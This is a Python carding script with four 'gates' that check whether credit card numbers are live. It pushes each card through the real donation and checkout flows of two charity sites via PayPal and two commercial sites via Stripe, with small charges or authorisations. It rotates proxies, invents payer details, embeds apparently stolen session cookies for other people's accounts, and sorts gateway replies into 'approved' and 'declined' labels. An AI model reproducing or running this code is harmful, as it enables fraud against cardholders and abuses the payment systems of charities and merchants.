import requests
import re
import base64
import random
import time
import uuid
import json
import cloudscraper
from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

# ============================================================================
# 🛠️ HELPER FUNCTIONS
# ============================================================================

def get_random_ua():
    return generate_user_agent(os=('linux', 'win'))

def format_proxy(proxy):
    """Formats proxy string to dictionary for requests"""
    if not proxy: return None
    try:
        if "http" in proxy: return {"http": proxy, "https": proxy}
        p = proxy.split(':')
        if len(p) == 4:
            url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
            return {"http": url, "https": url}
        elif len(p) == 2:
            url = f"http://{p[0]}:{p[1]}"
            return {"http": url, "https": url}
    except: return None
    return None

# ============================================================================
# 🚪 GATE 1: PayPal Commerce (Science)
# 📄 Source: pp.py / pa.py
# ============================================================================

def check_paypal_science(cc, proxy=None):
    try:
        # 1. Parse Card
        cc = cc.strip()
        try:
            n, mm, yy, cvc = cc.split('|')[0], cc.split('|')[1], cc.split('|')[2], cc.split('|')[3]
            if len(yy) == 4: yy = yy[2:]
        except:
            return "❌ Format Error (Use cc|mm|yy|cvv)", "ERROR"
        
        # 2. Setup Session
        session = requests.Session()
        # IMPORTANT: Ensure format_proxy is actually returning a valid dict
        formatted_proxy = format_proxy(proxy)
        if formatted_proxy:
            session.proxies = formatted_proxy
        
        ua = get_random_ua()
        
        # 3. Get Tokens (Page Load) - WITH RETRY LOGIC
        headers = {'user-agent': ua}
        try:
            r1 = session.get('https://scienceforthechurch.org/donate/', headers=headers, timeout=20)
        except requests.exceptions.ProxyError:
            return "❌ Proxy Dead", "ERROR"
        except requests.exceptions.ConnectionError:
            return "❌ Connection Error", "ERROR"
            
        try:
            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
            nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
            enc = re.search(r'"data-client-token":"(.*?)"', r1.text).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        except AttributeError:
            return "❌ Scrape Error (Site Changed/Blocked)", "ERROR"

        # 4. Create Order (WP-Ajax)
        headers = {
            'origin': 'https://scienceforthechurch.org',
            'referer': 'https://scienceforthechurch.org/donate/',
            'user-agent': ua,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        mp_data = MultipartEncoder(fields={
            'give-form-id': id_form2,
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-amount': '1.00',
            'give_first': 'Test',
            'give_last': 'User',
            'give_email': f'test{uuid.uuid4().hex[:8]}@gmail.com',
            'give-gateway': 'paypal-commerce'
        })
        
        headers['content-type'] = mp_data.content_type
        r2 = session.post('https://scienceforthechurch.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', 
                          headers=headers, data=mp_data, timeout=20)
        try:
            tok = r2.json()['data']['id']
        except:
            return "❌ Order Creation Failed", "DECLINED"

        # 5. Confirm Payment Source (PayPal API)
        headers_pp = {
            'authorization': f'Bearer {au}',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': ua
        }
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc
                }
            }
        }
        session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', 
                     headers=headers_pp, json=json_data, timeout=20)

        # 6. Approve Order (WP-Ajax)
        r4 = session.post(f'https://scienceforthechurch.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={tok}', 
                          headers=headers, data=mp_data, timeout=20)
        
        text = r4.text
        
        # 7. Logic
        if 'true' in text or 'success' in text: return "Charged $1.00", "APPROVED"
        elif 'INSUFFICIENT_FUNDS' in text: return "Insufficient Funds", "APPROVED"
        elif 'CVV2_FAILURE' in text: return "CCN Live (CVV Failed)", "APPROVED"
        elif 'DO_NOT_HONOR' in text: return "Do Not Honor", "DECLINED"
        elif 'PICKUP_CARD' in text: return "Pickup Card", "DECLINED"
        elif 'STOLEN' in text: return "Stolen Card", "DECLINED"
        elif 'INVALID_ACCOUNT' in text: return "Invalid Account", "DECLINED"
        else: return "Declined (Generic)", "DECLINED"

    except Exception as e:
        return f"Error: {str(e)}", "ERROR"

# ============================================================================
# 🚪 GATE 2: PayPal Commerce (SFTS)
# 📄 Source: paypalcvv.py
# ============================================================================

def check_paypal_sfts(cc, proxy=None):
    try:
        # 1. Parse Card
        cc = cc.strip()
        n, mm, yy, cvc = cc.split('|')[0], cc.split('|')[1], cc.split('|')[2], cc.split('|')[3]
        if "20" in yy and len(yy) == 4: yy = yy.split("20")[1]
        
        # 2. Setup Session
        r = requests.Session()
        r.proxies = format_proxy(proxy)
        
        # Headers from paypalcvv.py
        user = generate_user_agent()
        headers_init = {'user-agent': user}
        
        # 3. Get Page Data
        response = r.get('https://sfts.org.uk/donate/', headers=headers_init, timeout=20)
        
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)

        # 4. Specific Headers for SFTS
        headers = {
            'origin': 'https://sfts.org.uk',
            'referer': 'https://sfts.org.uk/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        # 5. Create Order
        data = MultipartEncoder({
            'give-form-id': id_form2,
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-amount': '1.00',
            'give_first': 'DRGAM',
            'give_last': 'rights and',
            'give_email': 'drgam22@gmail.com',
            'give-gateway': 'paypal-commerce'
        })
        headers['content-type'] = data.content_type
        
        response = r.post('https://sfts.org.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', 
                          headers=headers, data=data, timeout=20)
        try:
            tok = response.json()['data']['id']
        except:
            return "❌ Order Creation Failed", "DECLINED"

        # 6. PayPal Confirm
        headers_pp = {
            'authority': 'cors.api.paypal.com',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': user,
        }
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc
                }
            }
        }
        r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', 
               headers=headers_pp, json=json_data, timeout=20)

        # 7. Final Approve
        response = r.post(f'https://sfts.org.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={tok}',
                          headers=headers, data=data, timeout=20)
        
        text = response.text
        
        # 8. Detailed Response Logic from paypalcvv.py
        if 'true' in text or 'sucsess' in text: return "Charge $1.00", "APPROVED"
        elif 'DO_NOT_HONOR' in text: return "Do Not Honor", "DECLINED"
        elif 'ACCOUNT_CLOSED' in text: return "Account Closed", "DECLINED"
        elif 'CVV2_FAILURE' in text: return "CCN Live (CVV Failed)", "APPROVED"
        elif 'INSUFFICIENT_FUNDS' in text: return "Insufficient Funds", "APPROVED"
        elif 'RISK_THRESHOLD' in text: return "Risk Threshold", "DECLINED"
        elif 'PICKUP_CARD' in text: return "Pickup Card", "DECLINED"
        else: return "Declined", "DECLINED"

    except Exception as e:
        return f"Error: {str(e)}", "ERROR"


# ============================================================================
# 🚪 GATE 3: Stripe Auth (Associations)
# 📄 Source: checker.py
# ============================================================================

# Account Pool from checker.py (ESSENTIAL FOR BYPASSING LOGIN)
ACCOUNT_POOL = [
    {
        'name': 'Xray Xlea',
        'cookies': {
            '_ga': 'GA1.2.493930677.1768140612',
            '__stripe_mid': '66285028-f520-443b-9655-daf7134b8b855e5f16',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'xrayxlea%7C1769350388%7CxGcUPPOJgEHPSWiTK6F9YZpA6v4AgHki1B2Hxp0Zah5%7C3b8f3e6911e25ea6cccc48a4a0be35ed25e0479c9e90ccd2f16aa41cac04277d',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '7670%7Cother%7Cread%7Cb723e85c048d2147e793e6640d861ae4f4fddd513abc1315f99355cf7d2bc455',
            '__cf_bm': 'rd1MFUeDPNtBzTZMChisPSRIJpZKLlo5dgif0o.e_Xw-1769258154-1.0.1.1-zhaKFI8L0JrFcuTzj.N9OkQvBuz6HvNmFFKCSqfn_gE2EF3GD65KuZoLGPuEhRyVwkKakMr_mcjUehEY1mO9Kb9PKq1x5XN41eXwXQavNyk',
            '__stripe_sid': '4f84200c-3b60-4204-bbe8-adc3286adebca426c8',
        }
    },
    {
        'name': 'Yasin Akbulut',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8214%7Cother%7Cread%7Cde5fd05c6afc735d5df323de21ff23f598bb5e1893cb9a7de451b7a8d50dc782',
        }
    },
    {
        'name': 'Mehmet Demir',
        'cookies': {
             '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
             'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
             '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
             '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
             'sbjs_migrations': '1418474375998%3D1',
        }
    }
]

ULTRA_HEADERS = {
    'authority': 'associationsmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

def check_stripe_associations(cc, proxy=None):
    try:
        # 1. Parse Card
        cc = cc.strip()
        n, mm, yy, cvc = cc.split('|')
        yy = f"20{yy[-2:]}" if len(yy) <= 2 else yy
        
        # 2. Select Account and Setup Scraper
        acc = random.choice(ACCOUNT_POOL)
        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'android', 'mobile': True})
        
        if proxy:
            p_dict = format_proxy(proxy)
            scraper.proxies.update(p_dict)
        
        scraper.cookies.update(acc['cookies'])
        scraper.headers.update(ULTRA_HEADERS)

        # 3. Get Page & Keys
        try:
            r_page = scraper.get("https://associationsmanagement.com/my-account/add-payment-method/", timeout=25)
            pk_live = re.search(r'pk_live_[a-zA-Z0-9]+', r_page.text).group(0)
            addnonce = re.search(r'"createAndConfirmSetupIntentNonce":"([a-z0-9]+)"', r_page.text).group(1)
        except:
            return "❌ Failed to scrape keys (Login Dead/Protected)", "ERROR"

        # 4. Stripe Token Creation
        stripe_hd = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ULTRA_HEADERS['user-agent'],
        }

        stripe_payload = (
            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
            f'&billing_details[name]={acc["name"].replace(" ", "+")}'
            f'&billing_details[address][postal_code]=10001'
            f'&key={pk_live}'
            f'&muid={acc["cookies"].get("__stripe_mid", str(uuid.uuid4()))}'
            f'&sid={acc["cookies"].get("__stripe_sid", str(uuid.uuid4()))}'
            f'&guid={str(uuid.uuid4())}'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&time_on_page={random.randint(90000, 150000)}'
        )

        r_stripe_req = scraper.post('https://api.stripe.com/v1/payment_methods', headers=stripe_hd, data=stripe_payload, timeout=20)
        r_stripe = r_stripe_req.json()

        if 'id' not in r_stripe:
            err = r_stripe.get('error', {}).get('message', 'Radar Security Block')
            return f"Declined ({err})", "DECLINED"
            
        # 5. Confirm Intent (WP-Ajax)
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': r_stripe['id'],
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }
        
        r_ajax = scraper.post('https://associationsmanagement.com/wp-admin/admin-ajax.php', data=ajax_data, timeout=30).text
        text = r_ajax.lower()

        # 6. Final Logic from checker.py
        if '"success":true' in text: return "Approved (Auth)", "APPROVED"
        if 'insufficient_funds' in text: return "Insufficient Funds", "APPROVED"
        if 'incorrect_cvc' in text: return "CCN Live (CVC Incorrect)", "APPROVED"
        if 'security code' in text: return "CCN Live (Security Code)", "APPROVED"
        
        # Parse Decline Reason
        try:
            reason = re.search(r'message\":\"(.*?)\"', r_ajax)
            reason_txt = reason.group(1) if reason else 'Rejected'
            return f"Declined ({reason_txt})", "DECLINED"
        except:
            return "Declined", "DECLINED"

    except Exception as e:
        return f"Error: {str(e)}", "ERROR"


# ============================================================================
# 🚪 GATE 4: HostArmada (Stripe)
# 📄 Source: $tripeauth.py
# ============================================================================

def check_stripe_hostarmada(cc, proxy=None):
    try:
        # 1. Parse Card
        cc = cc.strip()
        n, mm, yy, cvc = cc.split('|')[0], cc.split('|')[1], cc.split('|')[2], cc.split('|')[3]
        if len(yy) == 2: yy = "20" + yy

        session = requests.Session()
        session.proxies = format_proxy(proxy)
        
        # Cookies from $tripeauth.py
        cookies = {
            'WHMCSy551iLvnhYt7': '8ca8a4c665c9ec28eab1f8221ad4101d',
            '_fbp': 'fb.1.1769757795735.772366065144413707',
            '__zlcmid': '1VroFkzAJVG59We',
            '__stripe_mid': '5330d896-1e8d-4606-a930-c28209c4f3e148b5e0',
            '__stripe_sid': '8fc0309c-0967-4bc6-b6ad-962a97b2ff618f802f',
        }
        
        # Headers from $tripeauth.py
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        # 2. Create Payment Method (Stripe API)
        # Using hardcoded PK and specific GUID/MUID from file
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b7547fec-aaeb-43cf-86ac-2d11a91f66ed6e4605&muid=5330d896-1e8d-4606-a930-c28209c4f3e148b5e0&sid=8fc0309c-0967-4bc6-b6ad-962a97b2ff618f802f&pasted_fields=number&payment_user_agent=stripe.js%2Fa10732936b%3B+stripe-js-v3%2Fa10732936b%3B+split-card-element&referrer=https%3A%2F%2Fmy.hostarmada.com&time_on_page=31195&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx'
        
        r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
        
        try:
            id_tok = r1.json()['id']
        except:
            return "❌ Token Error", "DECLINED"

        # 3. HostArmada Checkout
        headers2 = {
            'authority': 'my.hostarmada.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://my.hostarmada.com',
            'referer': 'https://my.hostarmada.com/cart.php?a=checkout',
            'user-agent': headers['user-agent'],
            'x-requested-with': 'XMLHttpRequest',
        }

        # Randomize User Info
        rnd = random.randint(1000,9999)
        data2 = {
            'token': '5657f42085350cb956addb77da8cea663100c2ab',
            'submit': 'true',
            'custtype': 'new',
            'firstname': 'Tommy',
            'lastname': 'K2itm',
            'email': f'Tommy{rnd}@gmail.com',
            'phonenumber': f'31540{rnd}',
            'password': 'Pedro1234',
            'password2': 'Pedro1234',
            'country': 'US',
            'state': 'New York',
            'address1': '402 California Avenue',
            'city': 'Bakersfield',
            'postcode': '10080',
            'paymentmethod': 'stripe',
            'accepttos': 'on',
            'payment_method_id': id_tok,
        }

        r2 = session.post('https://my.hostarmada.com/index.php?rp=/stripe/payment/intent', 
                          cookies=cookies, headers=headers2, data=data2, timeout=30)
        
        result = r2.json()
        
        # 4. Result Logic from $tripeauth.py
        if 'warning' in result:
             warning = result['warning']
             if "Insufficient" in warning: return "Insufficient Funds", "APPROVED"
             if "security code" in warning: return "CCN Live (Security Code)", "APPROVED"
             return f"Declined ({warning})", "DECLINED"
        
        if 'success' in str(result):
            return "Approved (Auth)", "APPROVED"
            
        return "Declined", "DECLINED"

    except Exception as e:
        return f"Error: {str(e)}", "ERROR"